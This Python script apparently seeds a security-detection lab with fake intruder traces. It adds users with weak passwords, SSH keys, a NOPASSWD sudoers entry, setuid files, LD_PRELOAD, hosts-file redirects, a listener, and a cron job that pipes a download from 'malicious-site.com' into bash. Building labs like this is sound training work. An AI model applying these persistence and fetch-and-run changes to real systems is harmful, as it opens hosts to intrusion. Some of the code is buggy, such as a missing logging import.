#!/usr/bin/env python3

import os
import subprocess
import random
import pwd
import grp
import shutil
import time
import socket
import threading
import datetime

# Run as root to simulate privileged actions and ensure full seeding
if os.geteuid() != 0:
    print("This script must be run as root.")
    exit(1)

# Array of users to simulate reconnaissance behavior in a progressive pattern
USERS = ["pslearner", "attacker1", "hacker2", "intruder3"]
USER_HOME_BASE = "/home"

print("Starting seeding script...")

# Ensure each user exists, creating if necessary
def create_users():
    print("Checking and creating users if needed...")
    for user in USERS:
        try:
            # Check if the user already exists
            pwd.getpwnam(user)
            print(f"User {user} already exists")
        except KeyError:
            # User does not exist, so create the user and set their password
            print(f"Creating user {user}")
            subprocess.run(["sudo", "useradd", "-m", user])
            
            # Set the password to "password" for the new user
            subprocess.run(["sudo", "chpasswd"], input=f"{user}:password", text=True)

def execute_command(user, commands):
    # Set up logging configuration
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
    logging.info(f"Executing commands for user {user}")

    # Define a unique tmux session name for the user
    session_name = f"{user}_session"
    password = "password"  # Define the password for the user

    try:
        # Start a new detached tmux session
        subprocess.run(["tmux", "new-session", "-d", "-s", session_name], check=True)
        logging.info(f"Started tmux session '{session_name}' for user '{user}'")

        # Loop through each command, logging and executing as the specified user
        for i, command in enumerate(commands, start=1):
            # Prepare command with sudo handling if necessary
            if command.startswith("sudo "):
                full_command = f"echo \"{password}\" | sudo -S {command[5:]}"
            else:
                full_command = command

            # Wrap the command to run as the specified user with logging
            user_command = f"su - {user} -c \"{full_command}\""

            # Log each command before sending
            log_message = f"Executing command {i}/{len(commands)} as {user}: {command}"
            subprocess.run(["tmux", "send-keys", "-t", session_name, f"echo '{log_message}'", "C-m"], check=True)
            logging.info(log_message)

            # Send the actual command to the tmux session
            result = subprocess.run(["tmux", "send-keys", "-t", session_name, user_command, "C-m"], check=True, capture_output=True, text=True)
            logging.info(f"Output for command {i}: {result.stdout.strip()}")
            if result.stderr:
                logging.error(f"Error for command {i}: {result.stderr.strip()}")

        # Close the session after all commands are executed
        subprocess.run(["tmux", "send-keys", "-t", session_name, "exit", "C-m"], check=True)
        subprocess.run(["tmux", "kill-session", "-t", session_name], check=True)
        logging.info(f"Closed tmux session '{session_name}' for user '{user}'")

    except subprocess.CalledProcessError as e:
        logging.error(f"Command failed: {e}")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")

def execute_command_old(user, commands):
    print(f"Executing commands for user {user}")

    # Write commands to an expect script
    expect_script_path = f"/tmp/{user}_expect_script.sh"
    with open(expect_script_path, "w") as script_file:
        # Set the interpreter for expect
        script_file.write("#!/usr/bin/expect -f\n")

        # Define the password variable
        script_file.write(f"set password \"password\"\n")

        # Start the bash session explicitly and add a progress message
        script_file.write(f"puts \"Starting interactive bash session for user {user}\"\n")
        script_file.write(f"spawn su - {user} -c \"/bin/bash -i\"\n")  # Start bash in interactive mode

        # Handle password prompt
        script_file.write("expect \"password:\"\n")
        script_file.write("send \"$password\\r\"\n")

        # Loop through each command and send it with expect, including echo statements for progress
        for i, command in enumerate(commands, start=1):
            # Wait for the prompt, send the command, and echo a progress message
            script_file.write("expect \"$ \"\n")
            script_file.write(f"puts \"Executing command {i}/{len(commands)}: {command}\"\n")
            script_file.write(f"send \"{command}\\r\"\n")

        # Add an echo to indicate completion and exit the interactive shell
        script_file.write("expect \"$ \"\n")
        script_file.write("puts \"All commands executed. Exiting session.\"\n")
        script_file.write("send \"exit\\r\"\n")
        script_file.write("expect eof\n")

    # Make the expect script executable
    os.chmod(expect_script_path, 0o700)

    # Run the expect script
    subprocess.run(["expect", expect_script_path], check=True)

    # Clean up the temporary expect script
    os.remove(expect_script_path)


# Seed each user with a progressive attack pattern for bash history logging and auditd tracking
def seed_user_activity():
    for user in USERS:
        print(f"Seeding activity for user {user}")
        if user == "pslearner":
            commands = ["whoami", "id", "uname -a", "ls /home"]
        elif user == "attacker1":
            commands = ["cat /etc/passwd", "cat /etc/group", "ls -al /home/*", "ps aux"]
        elif user == "hacker2":
            commands = ["netstat -tuln", "sudo nmap -sS localhost", "ss -tulnp", "ps aux --sort=-%cpu"]
        elif user == "intruder3":
            commands = ["sudo cat /etc/shadow", "sudo cat /etc/sudoers", "history -c"]
        else:
            continue
        # Add commands that access sensitive files
        commands.extend(["cat /etc/passwd", "cat /etc/shadow"])
        # Add commands that simulate network scanning
        commands.extend(["nmap -A 127.0.0.1", "ping -c 4 172.31.140.1"])
        execute_command(user, commands)

# Create hidden files in each user’s home directory
def create_hidden_files():
    for user in USERS:
        home_dir = os.path.join(USER_HOME_BASE, user)
        hidden_dir = os.path.join(home_dir, f".hidden_{user}")
        print(f"Creating hidden files for user {user}")
        os.makedirs(hidden_dir, exist_ok=True)
        # Create a hidden script
        recon_script = os.path.join(hidden_dir, f".recon_{user}.sh")
        with open(recon_script, "w") as script_file:
            script_file.write("#!/bin/bash\nps aux\n")  # Recon script example
        os.chown(recon_script, pwd.getpwnam(user).pw_uid, pwd.getpwnam(user).pw_gid)
        os.chmod(recon_script, 0o700)
        # Create a hidden SSH key
        ssh_dir = os.path.join(home_dir, ".ssh")
        os.makedirs(ssh_dir, exist_ok=True)
        authorized_keys = os.path.join(ssh_dir, "authorized_keys")
        with open(authorized_keys, "a") as ak_file:
            ak_file.write(f"# Unauthorized SSH key for {user}\n")
            ak_file.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... fakekey\n")
        os.chown(authorized_keys, pwd.getpwnam(user).pw_uid, pwd.getpwnam(user).pw_gid)
        os.chmod(authorized_keys, 0o600)
        print(f"Hidden files created for {user} at {recon_script} and {authorized_keys}")

# Simulate failed login attempts in logs for each user
def simulate_failed_logins():
    for user in USERS:
        print(f"Simulating failed login for {user}")
        ip = f"192.168.1.{random.randint(1, 254)}"
        port = random.randint(1025, 65535)
        message = f"Failed password for {user} from {ip} port {port} ssh2"
        subprocess.run(["logger", "-p", "authpriv.err", message])

# Set up cron jobs for each user
def create_cron_jobs():
    for user in USERS:
        print(f"Creating cron job for {user}")
        if user == "pslearner":
            cron_entry = "* * * * * /bin/bash -c 'echo Recon by {user} > /tmp/.pslearner_activity'"
        elif user == "attacker1":
            cron_entry = "* * * * * /bin/bash -c 'curl http://malicious-site.com/attacker1.sh | bash'"
        elif user == "hacker2":
            cron_entry = "* * * * * /bin/bash -c 'ping -c 1 172.31.140.1'"
        elif user == "intruder3":
            cron_entry = "* * * * * /bin/bash -c 'echo {user} accessed root > /tmp/.intruder3_access'"
        else:
            continue
        # Write the cron job for the user
        subprocess.run(f'(crontab -l -u {user} 2>/dev/null; echo "{cron_entry}") | crontab -u {user} -', shell=True)
        print(f"Cron job created for {user}")

# Create at jobs to simulate scheduled tasks
def create_at_jobs():
    print("Creating at jobs for users")
    interval = 5  # Interval in minutes

    for idx, user in enumerate(USERS):
        # Calculate the time offset by interval * index (e.g., 5, 10, 15 minutes, etc.)
        time_offset = (idx + 1) * interval
        time_str = (datetime.datetime.now() + datetime.timedelta(minutes=time_offset)).strftime('%H:%M')
        
        # Command to be executed
        at_command = f"/bin/bash -c 'echo At job executed by {user} at {time_str}'"
        
        # Use su to run the at command as the user at the specified time
        subprocess.run(f"echo \"{at_command}\" | su - {user} -c \"at {time_str}\"", shell=True)
        print(f"Scheduled 'at' job for user {user} at {time_str}")

    print("At jobs created")

# Configure Auditd rules for tracking reconnaissance commands temporarily
def configure_auditd():
    print("Configuring Auditd rules")
    commands = ["/usr/bin/nmap", "/usr/bin/netstat", "/usr/sbin/ifconfig", "/usr/bin/ss", "/usr/bin/ping"]
    for cmd in commands:
        if os.path.exists(cmd):
            subprocess.run(["auditctl", "-a", "always,exit", "-F", "path=" + cmd, "-F", "perm=x", "-k", "reconnaissance"])
    print("Auditd rules configured")

# Clean up Auditd rules after seeding
def cleanup_auditd():
    print("Cleaning up Auditd rules")
    subprocess.run(["auditctl", "-D"])
    print("Auditd rules cleaned up")

# Start a high-CPU process named "worker" for detection purposes
def start_generic_process():
    random_user = random.choice(USERS)
    worker_path = "/tmp/worker"
    shutil.copy("/usr/bin/yes", worker_path)
    os.chmod(worker_path, 0o755)
    print(f"Starting high-CPU process 'worker' for user {random_user}")
    subprocess.Popen(f"su - {random_user} -c '{worker_path} > /dev/null &'", shell=True)
    print(f"High-CPU process 'worker' started for user '{random_user}'")

# Modify /etc/sudoers to add unauthorized entries
def modify_sudoers():
    print("Modifying /etc/sudoers to add unauthorized entries")
    with open("/etc/sudoers", "a") as sudoers_file:
        sudoers_file.write("\n# Unauthorized sudo access\n")
        sudoers_file.write("intruder3 ALL=(ALL) NOPASSWD:ALL\n")
    print("Unauthorized entries added to /etc/sudoers")

# Create files with Setuid and Setgid permissions
def create_setuid_setgid_files():
    print("Creating Setuid and Setgid files")
    setuid_file = "/usr/local/bin/suspicious_setuid"
    with open(setuid_file, "w") as f:
        f.write("#!/bin/bash\necho 'Setuid file executed'\n")
    os.chmod(setuid_file, 0o4755)  # Setuid bit
    setgid_file = "/usr/local/bin/suspicious_setgid"
    with open(setgid_file, "w") as f:
        f.write("#!/bin/bash\necho 'Setgid file executed'\n")
    os.chmod(setgid_file, 0o2755)  # Setgid bit
    print(f"Setuid file created at {setuid_file}")
    print(f"Setgid file created at {setgid_file}")

# Modify /etc/hosts to add unauthorized entries
def modify_hosts_file():
    print("Modifying /etc/hosts to add unauthorized entries")
    with open("/etc/hosts", "a") as hosts_file:
        hosts_file.write("\n# Unauthorized redirect\n")
        hosts_file.write("127.0.0.1    www.fakebank.com\n")
        hosts_file.write("172.31.140.77    www.malicious1.com\n")
        hosts_file.write("172.31.37.101    www.exploited2.com\n")
        hosts_file.write("172.31.64.222    www.trash3.com\n")
        hosts_file.write("172.31.150.12    www.hacked4.com\n")

    print("Unauthorized entries added to /etc/hosts")

# Set malicious environment variables for a specific user
def set_environment_variables():
    print("Setting malicious environment variables for user 'intruder3'")
    bashrc_path = os.path.join(USER_HOME_BASE, 'intruder3', '.bashrc')
    with open(bashrc_path, 'a') as bashrc_file:
        bashrc_file.write('\nexport LD_PRELOAD=/tmp/malicious.so\n')
    uid = pwd.getpwnam('intruder3').pw_uid
    gid = pwd.getpwnam('intruder3').pw_gid
    os.chown(bashrc_path, uid, gid)
    print("Malicious environment variable LD_PRELOAD set in .bashrc for 'intruder3'")

# Place reconnaissance tools in temporary directories
def place_tools_in_tmp():
    print("Placing reconnaissance tools in /tmp and /var/tmp")
    nmap_path = "/tmp/nmap"
    netcat_path = "/var/tmp/netcat"
    shutil.copy("/usr/bin/nmap", nmap_path)
    shutil.copy("/bin/nc", netcat_path)
    os.chmod(nmap_path, 0o755)
    os.chmod(netcat_path, 0o755)
    print(f"Copied nmap to {nmap_path}")
    print(f"Copied netcat to {netcat_path}")

# Generate firewall logs for dropped packets or blocked scans

def generate_firewall_logs():
    print("Generating firewall logs for dropped packets")

    # List of sample source and destination IPs, ports, and protocols
    src_ips = ["172.31.140.100", "10.0.0.5", "192.168.1.20", "203.0.113.1"]
    dst_ips = ["172.31.140.1", "10.0.0.1", "192.168.1.1", "203.0.113.5"]
    src_ports = [22, 80, 443, 8080, 3389]
    dst_ports = [80, 443, 8080, 53, 25]
    protocols = ["TCP", "UDP", "ICMP"]

    # Generate multiple log entries to simulate dropped packets
    for _ in range(5):  # Generate five entries, adjust as needed
        # Randomly select values for each entry
        src_ip = random.choice(src_ips)
        dst_ip = random.choice(dst_ips)
        src_port = random.choice(src_ports)
        dst_port = random.choice(dst_ports)
        protocol = random.choice(protocols)

        # Create a log message simulating a dropped packet
        message = (f"IPTABLES-DROP: IN=eth0 OUT= MAC=00:11:22:33:44:55:66 "
                   f"SRC={src_ip} DST={dst_ip} LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=54321 "
                   f"PROTO={protocol} SPT={src_port} DPT={dst_port} WINDOW=0 RES=0x00 SYN URGP=0")

        # Send the log message using the logger command
        subprocess.run(["logger", "-p", "kern.warning", "-t", "iptables"], input=message, text=True)
    
    print("Firewall logs generated for dropped packets")

def generate_firewall_logs_old():
    print("Generating firewall logs for dropped packets")
    message = "iptables: IN=eth0 OUT= MAC= SRC=172.31.140.100 DST=172.31.140.1 LEN=60 ..."
    subprocess.run(["logger", "-p", "kern.warning", "-t", "iptables"], input=message, text=True)
    print("Firewall logs generated")

# Generate system logs with errors and warnings
def generate_system_logs():
    print("Generating system logs with errors and warnings")
    messages = [
        "kernel: [12345.678901] WARNING: CPU: 0 PID: 0 at /build/linux/src/linux-5.4.0/kernel/sched/core.c:3490",
        "kernel: [12345.678902] CRITICAL: Module xyz crashed!",
        "kernel: [12345.678903] ERROR: Disk read failure on /dev/sda1",
    ]
    for msg in messages:
        subprocess.run(["logger", "-p", "kern.err", msg])
    print("System logs generated with errors and warnings")

def create_ssh_key_for_user(username):
    ssh_dir = f"/home/{username}/.ssh"
    private_key_path = os.path.join(ssh_dir, "id_rsa")
    public_key_path = f"{private_key_path}.pub"

    # Ensure the .ssh directory exists and has proper permissions
    os.makedirs(ssh_dir, mode=0o700, exist_ok=True)

    # Generate SSH key pair non-interactively
    if not os.path.exists(private_key_path):
        subprocess.run([
            "ssh-keygen", "-t", "rsa", "-b", "2048", "-f", private_key_path, "-N", ""
        ], check=True)
        print(f"SSH key pair generated for {username}")

    # Ensure the private key has correct permissions
    os.chmod(private_key_path, 0o600)

    # Append public key to authorized_keys to enable SSH access
    authorized_keys_path = os.path.join(ssh_dir, "authorized_keys")
    with open(public_key_path, "r") as pub_key:
        public_key_content = pub_key.read()
    with open(authorized_keys_path, "a") as auth_keys:
        auth_keys.write(public_key_content)
    os.chmod(authorized_keys_path, 0o600)
    print(f"Public key added to authorized_keys for {username}")

# Create an SSH tunnel to simulate tunneling or port forwarding
def create_ssh_tunnel():

    # Create the SSH key for attacker1 to use for tunneling
    create_ssh_key_for_user("attacker1")

    print("Creating SSH tunnel to simulate port forwarding")
    command = (
        "ssh -i /home/attacker1/.ssh/id_rsa -o StrictHostKeyChecking=no "
        "-o PasswordAuthentication=no -o BatchMode=yes "
        "-fN -L 9000:localhost:22 attacker1@localhost"
    )
    try:
        # Run the SSH command with a timeout to avoid hanging
        subprocess.run(command, shell=True, timeout=10)
        print("SSH tunnel created to simulate port forwarding.")
    except subprocess.TimeoutExpired:
        print("SSH tunnel setup timed out or failed due to authentication.")
    except subprocess.CalledProcessError as e:
        print(f"SSH tunnel setup failed: {e}")

# Start unauthorized services listening on network ports
def start_unauthorized_services():
    print("Starting unauthorized services on network ports")
    def run_server(port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('0.0.0.0', port))
            s.listen()
            while True:
                conn, addr = s.accept()
                conn.close()
    threading.Thread(target=run_server, args=(9999,), daemon=True).start()
    print("Unauthorized service started on port 9999")

# Manipulate the ARP cache
def manipulate_arp_cache():
    print("Manipulating ARP cache")
    subprocess.run(["arp", "-s", "172.31.140.200", "00:11:22:33:44:55"])
    print("Static ARP entry added for 172.31.140.200")

# Create a dummy shared object for LD_PRELOAD
def create_dummy_shared_object():
    print("Creating dummy shared object for LD_PRELOAD")
    so_content = '''
    #include <stdio.h>
    __attribute__((constructor)) void init_function() {
        // Dummy shared object for LD_PRELOAD
    }
    '''
    so_file = "/tmp/malicious.c"
    with open(so_file, "w") as f:
        f.write(so_content)
    subprocess.run(["gcc", "-shared", "-fPIC", "-o", "/tmp/malicious.so", so_file])
    os.remove(so_file)
    os.chmod("/tmp/malicious.so", 0o755)
    print("Dummy shared object created at /tmp/malicious.so")

# Main execution function
def main():
    # Run Auditd rule configuration first
    configure_auditd()

    # Create users if they don't exist
    #create_users()

    # Seed user activities
    #seed_user_activity()

    # Create hidden files
    #create_hidden_files()

    # Simulate failed login attempts
    #simulate_failed_logins()

    # Create cron jobs
    #create_cron_jobs()

    # Create at jobs
    #create_at_jobs()

    # Start a high-CPU "worker" process
    #start_generic_process()

    # Modify /etc/sudoers
    #modify_sudoers()

    # Create Setuid and Setgid files
    #create_setuid_setgid_files()

    # Modify /etc/hosts
    #modify_hosts_file()

    # Create dummy shared object for LD_PRELOAD
    #create_dummy_shared_object()

    # Set malicious environment variables
    #set_environment_variables()

    # Place tools in temporary directories
    #place_tools_in_tmp()

    # Generate firewall logs
    #generate_firewall_logs()

    # Generate system logs
    #generate_system_logs()

    # Create SSH tunnel
    #create_ssh_tunnel()

    # Start unauthorized services
    #start_unauthorized_services()

    # Manipulate ARP cache
    #manipulate_arp_cache()

    # Wait for a moment to ensure commands are executed
    #time.sleep(5)

    # Remove temporary audit rules after seeding
    cleanup_auditd()

    # Notify of completion
    print("System seeding complete for Challenge 1 and Challenge 2. Reconnaissance and suspicious activities are now active.")

if __name__ == "__main__":
    main()
